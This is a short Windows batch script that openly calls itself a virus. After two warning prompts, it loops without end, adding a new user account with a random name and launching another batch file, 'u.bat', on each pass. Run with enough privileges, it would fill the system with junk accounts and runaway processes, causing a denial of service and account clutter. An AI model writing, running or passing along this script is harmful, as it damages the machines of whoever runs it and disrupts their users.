@echo off
title Run
echo This program that you are running is a virus. A computer virus is a type of malware that, when executed, replicates itself by modifying other computer programs and inserting its own code into those programs. If this replication succeeds, the affected areas are then said to be "infected" with a computer virus, a metaphor derived from biological viruses. If you are running this in a safe inveroment, and you know what you are doing, press space. Else exit this window.
pause
cls
echo This is the last warning.
pause
cls
color a
A:
net user %random% /add
start u.bat
goto A
